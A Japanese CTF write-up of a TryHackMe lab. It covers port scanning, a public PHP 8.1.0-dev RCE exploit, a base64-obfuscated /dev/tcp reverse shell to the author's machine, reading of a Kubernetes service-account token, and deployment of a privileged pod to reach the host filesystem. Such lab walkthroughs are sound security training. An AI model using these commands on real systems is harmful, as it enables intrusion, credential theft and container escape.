# Frank and Herby try again..... CTF

https://tryhackme.com/room/frankandherbytryagain

## Enumeration

```shell
TARGET=10.49.131.98
sudo bash -c "echo $TARGET   frank >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE    SERVICE      REASON
22/tcp    open     ssh          syn-ack ttl 64
10250/tcp open     unknown      syn-ack ttl 64
10255/tcp open     unknown      syn-ack ttl 64
10257/tcp open     unknown      syn-ack ttl 64
10259/tcp open     unknown      syn-ack ttl 64
16443/tcp open     unknown      syn-ack ttl 64
25000/tcp open     icl-twobase1 syn-ack ttl 64
30679/tcp filtered unknown      port-unreach ttl 64
```

```sh
sudo nmap -sV -p22,10250,10255,10257,10259,16443,25000,30679 $TARGET

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10257/tcp open  ssl/unknown
10259/tcp open  ssl/unknown
16443/tcp open  ssl/unknown
25000/tcp open  ssl/http    Gunicorn 19.7.1
30679/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

### ディレクトリ列挙

```sh
dirb http://$TARGET:30679

+ http://10.49.131.98:30679/info.php (CODE:200|SIZE:66761)
```

### 脆弱性

PHP 8.1.0-dev にはRCEの脆弱性があった。

```sh
$ searchsploit PHP 8.1.0-dev                
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
...
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                              | php/webapps/49933.py
...
```

シェルを取れた。

```sh
$ python ./49933.py
Enter the full host url:
http://frank:30679/

Interactive shell is opened on http://frank:30679/ 
Can't acces tty; job crontol turned off.
$ id
uid=0(root) gid=0(root) groups=0(root)
```

リバースシェル

```sh
$ echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzguMjM2Lzg4ODggMD4mMQ== | base64 -d | bash
```

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.138.236] from (UNKNOWN) [10.49.131.98] 57914
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

何も入っていないので、Podの中のゲストOS。

## 権限昇格

```sh
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1440 qdisc noqueue state UP group default 
    link/ether 2e:0e:37:56:7d:c0 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.30.129/32 brd 10.1.30.129 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::2c0e:37ff:fe56:7dc0/64 scope link 
       valid_lft forever preferred_lft forever
```

```sh
cat /etc/hosts
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
10.1.30.129     php-deploy-6d998f68b9-ntvd9
```

```sh
ping 10.1.30.129
PING 10.1.30.129 (10.1.30.129) 56(84) bytes of data.
64 bytes from 10.1.30.129: icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from 10.1.30.129: icmp_seq=2 ttl=64 time=0.029 ms
64 bytes from 10.1.30.129: icmp_seq=3 ttl=64 time=0.029 ms
```

```sh
# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```

トークン

```sh
# ls -al /var/run/secrets/kubernetes.io/serviceaccount
total 4
drwxrwxrwt 3 root root  140 Dec 20 00:39 .
drwxr-xr-x 3 root root 4096 Dec 20 00:39 ..
drwxr-xr-x 2 root root  100 Dec 20 00:39 ..2025_12_20_00_39_00.3154405770
lrwxrwxrwx 1 root root   32 Dec 20 00:39 ..data -> ..2025_12_20_00_39_00.3154405770
lrwxrwxrwx 1 root root   13 Dec 20 00:39 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Dec 20 00:39 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Dec 20 00:39 token -> ..data/token
```

```sh
# cat /var/run/secrets/kubernetes.io/serviceaccount/token
ey[REDACTED]
```

k8s環境

```sh
# env | grep KUBERNETES
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.152.183.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.152.183.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.152.183.1:443
KUBERNETES_SERVICE_HOST=10.152.183.1
```

失敗。HTTPSのところにHTTPを送ったため。

```sh
# bash -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);exec 3<>/dev/tcp/10.152.183.1/443;printf "GET /api HTTP/1.1\r\nHost: 10.152.183.1\r\nAuthorization: Bearer %s\r\n\r\n" "$TOKEN" >&3;cat <&3'
HTTP/1.0 400 Bad Request

Client sent an HTTP request to an HTTPS server.
cat: -: Connection reset by peer
```

kubectlをコピー

```sh
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

```sh
nc -lvnp 4444 < kubectl

bash -c 'cat < /dev/tcp/192.168.138.236/4444 > kubectl'
```

## kubectl

```sh
# ./kubectl get pods --token=$TOKEN
NAME                          READY   STATUS        RESTARTS       AGE
php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (166d ago)   3y274d
php-deploy-6d998f68b9-jgljv   1/1     Running       0              18m
```

権限は無制限

```sh
# ./kubectl auth can-i --list --token=$TOKEN
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```

無制限Podをデプロイ

```sh
# ./kubectl apply -f privesc.yml --token=${TOKEN}
pod/everything-allowed-exec-pod created

# ./kubectl get pods --token=$TOKEN
NAME                          READY   STATUS        RESTARTS       AGE
php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (166d ago)   3y274d
php-deploy-6d998f68b9-jgljv   1/1     Running       0              22m
everything-allowed-exec-pod   1/1     Running       0              14s
```

大元のシェルがWebシェルでありTTYが無いためエラーが出た

```sh
# ./kubectl exec -it everything-allowed-exec-pod --token=${TOKEN} -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
```

単発コマンド実行を使い、ホストの /root を見ることに成功

```sh
# ./kubectl exec everything-allowed-exec-pod --token=${TOKEN} -- ls -al /host/root
total 32
drwx------  5 root root 4096 Jul  6 08:25 .
drwxr-xr-x 20 root root 4096 Dec 20 01:38 ..
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jul  6 08:24 .cache
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Jul  6 08:20 .ssh
-rw-------  1 root root    0 Jul  6 08:25 .viminfo
-rw-r--r--  1 root root   32 Mar 20  2022 root.txt
drwx------  4 root root 4096 Mar 20  2022 snap
```

ユーザーフラグを入手して終わり

```sh
# ./kubectl exec everything-allowed-exec-pod --token=${TOKEN} -- ls -al /host/home
total 20
drwxr-xr-x  5 root root 4096 Dec 20 01:38 .
drwxr-xr-x 20 root root 4096 Dec 20 01:38 ..
drwxr-xr-x  6 1000 1000 4096 Mar 21  2022 herby
drwxr-xr-x  2 1001 1001 4096 Jul  6 07:56 ssm-user
drwxr-xr-x  3 1002 1003 4096 Dec 20 01:38 ubuntu
```

```sh
# ./kubectl exec everything-allowed-exec-pod --token=${TOKEN} -- ls -al /host/home/herby
total 56
drwxr-xr-x 6 1000 1000 4096 Mar 21  2022 .
drwxr-xr-x 5 root root 4096 Dec 20 01:38 ..
lrwxrwxrwx 1 1000 1000    9 Mar 21  2022 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 1000 1000 3771 Feb 25  2020 .bashrc
drwx------ 2 1000 1000 4096 Mar 20  2022 .cache
drwxr-x--- 3 1000 1000 4096 Mar 20  2022 .kube
-rw-r--r-- 1 1000 1000  807 Feb 25  2020 .profile
-rw-r--r-- 1 1000 1000    0 Mar 20  2022 .sudo_as_admin_successful
-rw------- 1 1000 1000 6290 Mar 21  2022 .viminfo
drwxrwxr-x 2 1000 1000 4096 Dec 20 02:07 app
-rw-rw-r-- 1 1000 1000  376 Mar 20  2022 deploy.yaml
-rw-rw-r-- 1 1000 1000  585 Mar 21  2022 php-deploy.yaml
drwx------ 3 1000 1000 4096 Mar 20  2022 snap
-rw-rw-r-- 1 1000 1000   25 Mar 21  2022 user.txt
```

## 振り返り

- PHP 8.1.0-dev はなんとなく既視感があったが、すぐには気づけなかった。
- 今回一番困ったのは、ファイルをコピーする方法。bashを使ってコピーする方法を学んだ。
- Podは必ずK8Sの環境情報を持っているので、kubectlバイナリをコピーするだけで使える。そこがdockerエスケープと大きく異なる点。

## Tags

#tags:PHP脆弱性 #tags:Kubernetes
